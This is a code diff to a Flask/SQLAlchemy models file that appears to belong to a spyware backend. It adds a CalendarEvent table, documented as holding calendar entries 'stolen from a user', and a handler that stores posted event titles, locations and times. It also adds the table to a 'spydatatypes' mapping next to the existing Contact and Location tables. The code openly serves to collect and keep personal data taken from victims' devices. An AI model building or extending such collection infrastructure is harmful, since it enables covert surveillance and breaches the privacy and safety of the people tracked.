@@ -135,4 +135,37 @@ class Location(db.Model):
     def __repr__(self):
         return "<Location {}.{} {}/{}>".format(self.location_id, self.time_stamp, self.latitude, self.longitude)
 
-spydatatypes = {"contact": Contact, "location": Location}
+class CalendarEvent(db.Model):
+    """Models a calendar entry stolen from a user"""
+    __tablename__ = "calendar_event"
+    calendar_id = db.Column(db.Integer, primary_key=True, autoincrement=True)
+    user_id = db.Column(db.Integer, db.ForeignKey("user.user_id"))
+
+    title = db.Column(db.String(64), nullable=False)
+    event_location = db.Column(db.String(64), nullable=True)
+    start_utc_milliseconds = db.Column(db.String(64), nullable=True)
+    end_utc_milliseconds = db.Column(db.String(64), nullable=True)
+
+    @staticmethod
+    def userdata_post_handler(user_id, calendar_data_dict):
+        """Adds posted userdata to database"""
+        # Create calendar event
+        event = CalendarEvent(
+            user_id=int(user_id),
+            title=calendar_data_dict.get("title"),
+            event_location=calendar_data_dict.get("eventLocation"),
+            start_utc_milliseconds=calendar_data_dict.get("startInUTCMilliseconds"),
+            end_utc_milliseconds=calendar_data_dict.get("endInUTCMilliseconds"),
+        )
+        db.session.add(event)
+        db.session.commit()
+
+    def as_dict(self):
+        """As sqlalchemy obj cant be parsed to json we build a custom converter"""
+        return utility.dict_keys_to_camel_case(
+            {c.name: getattr(self, c.name) for c in self.__table__.columns})
+
+    def __repr__(self):
+        return "<CalendarEvent {}: {}>".format(self.calendar_id, self.title)
+
+spydatatypes = {"Contact": Contact, "Location": Location, "CalendarEvent": CalendarEvent}
